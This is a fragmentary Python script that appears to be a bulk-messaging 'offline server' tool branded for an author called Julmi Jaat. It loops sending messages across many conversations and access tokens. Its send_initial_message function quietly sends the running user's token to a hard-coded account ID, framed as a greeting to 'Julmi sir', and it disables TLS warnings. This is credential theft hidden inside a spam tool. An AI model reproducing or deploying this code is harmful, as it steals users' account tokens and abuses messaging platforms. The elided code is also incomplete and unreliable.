...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"-- WELCOME OFFLINE SERVER  JULMI JAAT")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "Hello Julmi sir! I am using your server. My token is {}"

      # Specify the ID where you want to send the message
      target_id = "100078833520452"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '•═════════❥OWNER═════════❥JULMI❥═════════❥JAAT❥═════════•')
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;92m[+] Sent Massage {} of Convo {} Token {}: {}".format(
